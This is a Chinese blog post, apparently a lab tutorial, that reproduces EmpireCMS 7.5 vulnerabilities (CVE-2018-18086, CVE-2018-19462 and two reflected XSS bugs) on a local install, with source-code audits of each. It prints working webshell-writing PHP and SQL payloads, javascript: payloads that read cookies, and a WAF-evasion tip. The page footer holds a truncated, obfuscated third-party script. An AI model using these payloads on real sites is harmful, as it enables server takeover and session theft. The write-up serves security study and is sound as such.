<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>web靶场搭建之帝国cms7.5 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">web靶场搭建之帝国cms7.5</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:0px"></p> 
<p id="%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-toc" style="margin-left:0px"><a href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0">一、漏洞描述</a></p> 
<p id="%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-toc" style="margin-left:0px"><a href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">二、漏洞环境</a></p> 
<p id="%E4%B8%89%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-toc" style="margin-left:0px"><a href="#%E4%B8%89%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">三、环境搭建</a></p> 
<p id="%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:0px"><a href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">四、漏洞复现</a></p> 
<p id="%E5%90%8E%E5%8F%B0getshell(CVE-2018-18086)-toc" style="margin-left:40px"><a href="#%E5%90%8E%E5%8F%B0getshell%28CVE-2018-18086%29">后台getshell(CVE-2018-18086)</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A">漏洞原理：</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A">漏洞复现：</a></p> 
<p id="%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A">源码审计：</a></p> 
<p id="%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5-(CVE-2018-19462)-toc" style="margin-left:40px"><a href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5-%28CVE-2018-19462%29">代码注入 (CVE-2018-19462)</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理：</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A">漏洞复现：</a></p> 
<p id="%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%C2%A0-toc" style="margin-left:80px"><a href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%C2%A0">源码审计： </a></p> 
<p id="%E5%90%8E%E5%8F%B0XSS-toc" style="margin-left:40px"><a href="#%E5%90%8E%E5%8F%B0XSS">后台XSS</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%EF%BC%9A">漏洞类型：</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%EF%BC%9A">漏洞文件：</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A">漏洞原理：</a></p> 
<p id="payload%EF%BC%9A-toc" style="margin-left:80px"><a href="#payload%EF%BC%9A">payload：</a></p> 
<p id="%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A">源码分析：</a></p> 
<p id="%E5%89%8D%E5%8F%B0xss-toc" style="margin-left:40px"><a href="#%E5%89%8D%E5%8F%B0xss">前台xss</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%EF%BC%9A">漏洞类型：</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%EF%BC%9A">漏洞文件：</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A">漏洞原理：</a></p> 
<p id="payload%EF%BC%9A-toc" style="margin-left:80px"><a href="#payload%EF%BC%9A">payload：</a></p> 
<hr id="hr-toc">
<h1>一、漏洞描述</h1> 
<p>帝国CMS系统，EmpireCMS 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。该漏洞的产生，最根源的问题是没有对get,post提交方式进行严格的安全效验与过滤，导致可以插入恶意代码到后端服务器去处理，导致漏洞的发生。</p> 
<h1 id="%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">二、漏洞环境</h1> 
<p>EmpireCMS &lt;= 7.5</p> 
<p>phpstudy8.1.1.3</p> 
<p>MySQL8.0.12</p> 
<h1 id="%E4%B8%89%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">三、环境搭建</h1> 
<p>下载地址：<a href="http://www.phome.net/download/" title="帝国软件 -&gt; 产品下载">帝国软件 -&gt; 产品下载</a></p> 
<p>下载安装包那一行的简体GBK版。之后将压缩包里面的文件压缩到phpstudy根目录下自己新建的一个目录里面，这里起名为Empirecms。然后打开phpstudy里面的apache和MySQL，之后在浏览器中访问 http://ip/Empirecms/upload/e/install/index.php，之后一直点下一步就可以了。</p> 
<h1 id="%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">四、漏洞复现</h1> 
<p>安装完成后进入cms后台，如果安装成功应该是这样的 </p> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/e2/25/0hSI5pP7_o.png"></p> 
<h2 id="%E5%90%8E%E5%8F%B0getshell(CVE-2018-18086)"><strong>后台getshell(CVE-2018-18086)</strong></h2> 
<h3 id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A">漏洞原理：</h3> 
<p>EmpireCMS 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。</p> 
<p>EmpireCMS7.5版本中的/e/class/moddofun.php文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。</p> 
<h3 id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A">漏洞复现：</h3> 
<p>来到导入系统模型页面</p> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/68/8b/mYWC0lZm_o.png"></p> 
<p> 本地准备一个1.php并改名为1.php.mod，注意这里需要用$进行转义，存放的数据表名需要填一个数据库内没有的表名，比如abcd，点击上传</p> 
<pre><code class="language-php">&lt;?php file_put_contents("getshell.php","&lt;?php @eval($_POST[cmd]); ?&gt;");?&gt;</code></pre> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/e6/48/slN8M1El_o.png"></p> 
<p>访问一下</p> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/67/61/84KksJ4J_o.png"></p> 
<p> 访问成功没有报错，拿蚁剑连一下</p> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/ef/d3/VeEhaAoq_o.png"></p> 
<p>连接成功。 </p> 
<p>注：如果有waf报错500，应该是禁止web流量，我们上传的一句话木马默认情况下是不进行加密的，所以很容易被waf识别并拦截。</p> 
<p>解决方法：使用蚁剑自带的base64编码器和解密器即可成功上线，这里也可以用自己的编码器和解密器绕过waf拦截</p> 
<h3 id="%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A">源码审计：</h3> 
<p>Seay打开源码，</p> 
<p>在/upload/e/admin/ecmsmod.php里面可以看到</p> 
<pre><code class="language-php">//导入模型
elseif($enews=="LoadInMod")
{
	$file=$_FILES['file']['tmp_name'];
    $file_name=$_FILES['file']['name'];
    $file_type=$_FILES['file']['type'];
    $file_size=$_FILES['file']['size'];
	LoadInMod($_POST,$file,$file_name,$file_type,$file_size,$logininid,$loginin);
}</code></pre> 
<p>跟进LoadInMod函数，在/upload/e/class/moddofun.php里面可以看到</p> 
<pre><code class="language-php">//导入系统模型
function LoadInMod($add,$file,$file_name,$file_type,$file_size,$userid,$username){
	global $empire,$dbtbpre,$ecms_config;
	//验证权限
	CheckLevel($userid,$username,$classid,"table");
	$tbname=RepPostVar(trim($add['tbname']));
	if(!$file_name||!$file_size||!$tbname)
	{
		printerror("EmptyLoadInMod","");
	}
	//扩展名
	$filetype=GetFiletype($file_name);
	if($filetype!=".mod")
	{
		printerror("LoadInModMustmod","");
	}
	//表名是否已存在
	$num=$empire-&gt;gettotal("select count(*) as total from {$dbtbpre}enewstable where tbname='$tbname' limit 1");
	if($num)
	{
		printerror("HaveLoadInTb","");
	}
	//上传文件
	$path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";
	$cp=@move_uploaded_file($file,$path);
	if(!$cp)
	{
		printerror("EmptyLoadInMod","");
	}
	DoChmodFile($path);
	@include($path);
	UpdateTbDefMod($tid,$tbname,$mid);
	//公共变量
	TogSaveTxtF(1);
	GetConfig(1);//更新缓存
	//生成模型表单文件
	$modr=$empire-&gt;fetch1("select mtemp,qmtemp,cj from {$dbtbpre}enewsmod where mid='$mid'");
	ChangeMForm($mid,$tid,$modr[mtemp]);//更新表单
	ChangeQmForm($mid,$tid,$modr[qmtemp]);//更新前台表单
	ChangeMCj($mid,$tid,$modr[cj]);//采集表单
	//删除文件
	DelFiletext($path);
	//操作日志
	insert_dolog("tid=$tid&amp;tb=$tbname&lt;br&gt;mid=$mid");
	printerror("LoadInModSuccess","db/ListTable.php".hReturnEcmsHashStrHref2(1));
}</code></pre> 
<p>看到include()文件包含，path参数在上面上传文件处使用time().makepassword(10)进行加密文件名，跟进make_password()函数，在/upload/e/class/connect.php里看到</p> 
<pre><code class="language-php">function make_password($pw_length){
	$low_ascii_bound=48;
	$upper_ascii_bound=122;
	$notuse=array(58,59,60,61,62,63,64,91,92,93,94,95,96);
	while($i&lt;$pw_length)
	{
		if(PHP_VERSION&lt;'4.2.0')
		{
			mt_srand((double)microtime()*1000000);
		}
		mt_srand();
		$randnum=mt_rand($low_ascii_bound,$upper_ascii_bound);
		if(!in_array($randnum,$notuse))
		{
			$password1=$password1.chr($randnum);
			$i++;
		}
	}
	return $password1;
}</code></pre> 
<p>一个伪随机数生成，因此可以通过添加创建文件的代码绕过。</p> 
<h2 id="%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5-(CVE-2018-19462)"><strong>代码注入 (CVE-2018-19462)</strong></h2> 
<h3 id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><strong>漏洞原理：</strong></h3> 
<p>EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。</p> 
<p>该漏洞源于外部输入数据构造代码段的过程中，网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。</p> 
<h3>漏洞复现：</h3> 
<p>来到执行SQL语句页面</p> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/a2/e0/5ChCl0v0_o.png"></p> 
<p>首先我们要知道存放的绝对路径，这里可以使用一个phpinfo()用第一种方法传上去，</p> 
<pre><code class="language-php">&lt;?php file_put_contents("getshell.php","&lt;?php phpinfo();?&gt;");?&gt;
</code></pre> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/f1/f9/P6crvfdt_o.png"></p> 
<p>之后访问</p> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/a0/b4/JFpI1W7e_o.png"> </p> 
<p>这里只是找到了php的绝对路径，还不是web所存储的路径，这时候查看源代码搜索DOCUMENT_ROOT查询网站所处的绝对路径</p> 
<p style="text-align:center"> <img alt="" src="https://images2.imgbox.com/59/ea/Guv9WD0F_o.png"></p> 
<p>用select … into outfile语句写入php一句话木马</p> 
<pre><code class="language-php">select '&lt;?php @eval($_POST[123])?&gt;' into outfile 'D:/vmworkstation/phpstudy/phpstudy_pro/WWW/Empirecms/upload/e/admin/get.php'
</code></pre> 
<p style="text-align:center"> <img alt="" src="https://images2.imgbox.com/1f/54/FruDKSpa_o.png"></p> 
<p>蚁剑连接</p> 
<p style="text-align:center"> <img alt="" src="https://images2.imgbox.com/65/04/uxeKFB6B_o.png"></p> 
<p>成功连上 </p> 
<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/59/a7/JLHTgsce_o.png"></p> 
<h3 id="%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%C2%A0">源码审计： </h3> 
<p>来到/e/admin/db/DoSql.php处，</p> 
<pre><code class="language-php">//执行SQL语句
function DoExecSql($add,$userid,$username){
	global $empire,$dbtbpre;
	$dosave=(int)$add['dosave'];
	$query=$add['query'];
	if(!$query)
	{
		printerror("EmptyDoSqlQuery","history.go(-1)");
    }
	if($dosave==1&amp;&amp;!$add['sqlname'])
	{
		printerror("EmptySqltext","history.go(-1)");
	}
	$query=ClearAddsData($query);
	//保存
	if($dosave==1)
	{
		$add['sqlname']=hRepPostStr($add['sqlname'],1);
		$isql=$empire-&gt;query("insert into {$dbtbpre}enewssql(sqlname,sqltext) values('".$add['sqlname']."','".addslashes($query)."');");
	}
	$query=RepSqlTbpre($query);
	DoRunQuery($query);
	//操作日志
	insert_dolog("query=".$query);
	printerror("DoExecSqlSuccess","DoSql.php".hReturnEcmsHashStrHref2(1));
}</code></pre> 
<p>转到定义RepSqlTbpre，发现只对表的前缀做了替换</p> 
<pre><code class="language-php">//替换表前缀
function RepSqlTbpre($sql){
	global $dbtbpre;
	$sql=str_replace('[!db.pre!]',$dbtbpre,$sql);
	return $sql;
}</code></pre> 
<p>转到定义DoRunQuery，对$query进行处理。</p> 
<pre><code class="language-php">//运行SQL
function DoRunQuery($sql){
	global $empire;
	$sql=str_replace("r","n",$sql);
	$ret=array();
	$num=0;
	foreach(explode(";n",trim($sql)) as $query)
	{
		$queries=explode("n",trim($query));
		foreach($queries as $query)
		{
			$ret[$num].=$query[0]=='#'||$query[0].$query[1]=='--'?'':$query;
		}
		$num++;
	}
	unset($sql);
	foreach($ret as $query)
	{
		$query=trim($query);
		if($query)
		{
			$empire-&gt;query($query);
		}
	}
}</code></pre> 
<p>对$sql参数只做了去除空格、以;分隔然后遍历,没有做别的限制和过滤,导致可以执行恶意的sql语句</p> 
<p>注：我们知道secure_file_priv这个参数在mysql的配置文件里起到的是能否写入的作用，当secure_file_priv = 为空，则可以写入sql语句到数据库，当secure_file_priv = NULL，则不可以往数据库里写sql语句，当secure_file_priv = /xxx，一个指定目录的时候，就只能往这个指定的目录里面写东西</p> 
<h2 id="%E5%90%8E%E5%8F%B0XSS">后台XSS</h2> 
<h3 id="%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%EF%BC%9A">漏洞类型：</h3> 
<p>反射型xss</p> 
<h3 id="%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%EF%BC%9A">漏洞文件：</h3> 
<p>localhost/Empirecms/upload/e/admin/openpage/AdminPage.php</p> 
<h3>
<strong>漏洞原理</strong>：</h3> 
<p>该漏洞是由于代码只使用htmlspecialchars进行实体编码过滤，而且参数用的是ENT_QUOTES(编码双引号和单引号),还有addslashes函数处理，但是没有对任何恶意关键字进行过滤，从而导致攻击者使用别的关键字进行攻击</p> 
<h3 id="payload%EF%BC%9A">payload：</h3> 
<pre><code class="language-html">http://192.168.0.6/Empirecms/upload/e/admin/openpage/AdminPage.php?ehash_dBV7d=hsAhUCcwEbIjXksMUzC6&amp;mainfile=javascript:alert(1)</code></pre> 
<p>其中ehash是随机生成的，在登录时可以看到ehash_dBV7d=hsAhUCcwEbIjXksMUzC6，如果缺少这个hash值，则会提示非法来源</p> 
<pre><code class="language-html">http://192.168.0.6/Empirecms/upload/e/admin/openpage/AdminPage.php?ehash_dBV7d=hsAhUCcwEbIjXksMUzC6&amp;mainfile=javascript:alert(document.cookie)</code></pre> 
<h3 id="%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A">源码分析：</h3> 
<p>打开Empirecms/upload/e/admin/openpage/AdminPage.php</p> 
<pre><code class="language-php">//变量
$leftfile=hRepPostStr($_GET['leftfile'],1);
$mainfile=hRepPostStr($_GET['mainfile'],1);</code></pre> 
<p>利用hRepPostStr函数进行过滤，跳转到该函数的定义如下</p> 
<pre><code class="language-php">//处理提交字符
function hRepPostStr($val,$ecms=0,$phck=0){
	if($phck==1)
	{
		CkPostStrCharYh($val);
	}
	if($ecms==1)
	{
		$val=ehtmlspecialchars($val,ENT_QUOTES);
	}
	CkPostStrChar($val);
	$val=AddAddsData($val);
	return $val;
}</code></pre> 
<p>用ehtmlspecialchars函数进行HTML实体编码过滤，其中ENT_QUOTES -<br> 编码双引号和单引号。</p> 
<pre><code class="language-php">//htmlspecialchars处理
function ehtmlspecialchars($val,$flags=ENT_COMPAT){
	global $ecms_config;
	if(PHP_VERSION&gt;='5.4.0')
	{
		if($ecms_config['sets']['pagechar']=='utf-8')
		{
			$char='UTF-8';
		}
		else
		{
			$char='ISO-8859-1';
		}
		$val=htmlspecialchars($val,$flags,$char);
	}
	else
	{
		$val=htmlspecialchars($val,$flags);
	}
	return $val;
}</code></pre> 
<p>要利用htmlspecialchars函数把字符转换为HTML实体</p> 
<p>网页输出</p> 
<p>然而输出的位置是在iframe标签的src里，这意味着之前的过滤都没有什么用。iframe标签可以执行js代码，因此可以利用javascript:alert(1)触发xss</p> 
<h2 id="%E5%89%8D%E5%8F%B0xss">前台xss</h2> 
<h3>漏洞类型：</h3> 
<p>反射型xss</p> 
<h3>漏洞文件：</h3> 
<p>localhost/EmpireCMS/upload/e/ViewImg/index.html</p> 
<h3>漏洞原理：</h3> 
<p>url地址经过Request函数处理之后,把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值</p> 
<pre><code class="language-php">if(Request("url")!=0){
	document.write("&lt;a title="点击观看完整的图片..." href=""+Request("url")+"" target="_blank"&gt;&lt;img src=""+Request("url")+"" border=0 class="picborder" onmousewheel="return bbimg(this)" onload="if(this.width&gt;screen.width-500)this.style.width=screen.width-500;"&gt;");
</code></pre> 
<p>通过Request函数获取地址栏的url参数,并作为img和a标签的src属性和href属性,然后经过document.write输出到页面。</p> 
<p>转到request函数定义</p> 
<pre><code class="language-php">function Request(sName)
{

  /*
   get last loc. of ?
   right: find first loc. of sName
   +2
   retrieve value before next &amp;
  
  */
  
  var sURL = new String(window.location);
  var iQMark= sURL.lastIndexOf('?');
  var iLensName=sName.length;
  
  //retrieve loc. of sName
  var iStart = sURL.indexOf('?' + sName +'=') //limitation 1
  if (iStart==-1)
        {//not found at start
        iStart = sURL.indexOf('&amp;' + sName +'=')//limitation 1
		if (iStart==-1)
		   {//not found at end
		    return 0; //not found
		   }   
        }
        
  iStart = iStart + + iLensName + 2;
  var iTemp= sURL.indexOf('&amp;',iStart); //next pair start
  if (iTemp ==-1)
		{//EOF
		iTemp=sURL.length;
		}  
  return sURL.slice(iStart,iTemp ) ;
  sURL=null;//destroy String
}</code></pre> 
<p>通过window.location获取当前url地址,根据传入的url参数,获取当前参数的起始位置和结束位置</p> 
<h3>payload：</h3> 
<pre><code class="language-html">/Empirecms/upload/e/ViewImg/index.html?url=javascript:alert(document.cookie)
</code></pre> 
<blockquote> 
 <p><em>payload解析：</em></p> 
 <p><em>当浏览器载入一个Javascript<br> URL时，它会执行URL中所包含的Javascript代码，并且使用最后一个Javascript语句或表达式的值，转换为一个字符串，作为新载入的文档的内容显示。</em></p> 
 <p><em>javascript:伪协议可以和HTML属性一起使用，该属性的值也应该是一个URL。一个超链接的href属性就满足这种条件。当用户点击一个这样的链接，指定的Javascript代码就会执行。在这种情况下，Javascript<br> URL本质上是一个onclick事件句柄的替代。</em></p> 
</blockquote> 
<p>点击图片触发xss</p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X